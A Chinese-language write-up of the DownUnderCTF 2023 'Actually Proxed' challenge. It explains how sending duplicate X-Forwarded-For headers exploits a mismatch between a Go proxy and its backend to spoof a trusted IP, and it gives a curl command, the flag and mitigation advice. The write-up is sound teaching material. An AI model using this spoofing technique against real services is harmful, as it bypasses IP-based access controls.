# DownUnderCTF 2023 Actually Proxed Writeup

## 题目简述

后端只信任客户端 IP `31.33.33.7`，并从 `X-Forwarded-For` 的最后一个请求头、再取该头最后一个逗号分隔值作为真实地址。前置代理试图把 TCP 对端地址追加到 `X-Forwarded-For`，但只修改它遇到的第一条同名请求头。

由于 Go 的 HTTP 客户端会保留多值请求头，攻击者发送两条 `X-Forwarded-For` 后，代理修补的是第一条，后端信任的却是最后一条，从而可以伪造受信 IP。

## 解题过程

代理先把原始请求头保存为有序列表，随后执行：

```go
for i, header := range headers {
    if strings.ToLower(header[0]) == "x-forwarded-for" {
        headers[i][1] = fmt.Sprintf("%s, %s", header[1], clientIP)
        break
    }
}
```

`break` 使它只处理第一条。之后代码把重复头合并进 `map[string][]string`，因此两条值仍会被转发。后端的选择逻辑则是：

```go
xff := r.Header.Values("X-Forwarded-For")
ips := strings.Split(xff[len(xff)-1], ", ")
ip := strings.TrimSpace(ips[len(ips)-1])
```

假设攻击者真实地址为 `A`，发送两条相同伪造头后，数据流为：

```text
客户端发送:
X-Forwarded-For: 31.33.33.7
X-Forwarded-For: 31.33.33.7

代理转发:
X-Forwarded-For: 31.33.33.7, A
X-Forwarded-For: 31.33.33.7

后端取最后一条的最后一个地址:
31.33.33.7
```

利用命令如下。必须让客户端实际发送两个独立请求头，而不是只发送一个逗号列表：

```bash
curl 'http://TARGET/' \
  -H 'X-Forwarded-For: 31.33.33.7' \
  -H 'X-Forwarded-For: 31.33.33.7'
```

后端通过检查并返回：

```text
DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}
```

## 方法总结

`X-Forwarded-For` 的安全性依赖代理链对重复头和逗号列表采用一致语义。本题的代理与后端分别信任“第一条被修补的头”和“最后一条被读取的头”，产生了解析差异。稳妥的实现应拒绝客户端提供的受信代理头，或先规范化全部同名值，再由可信代理统一追加真实对端地址。
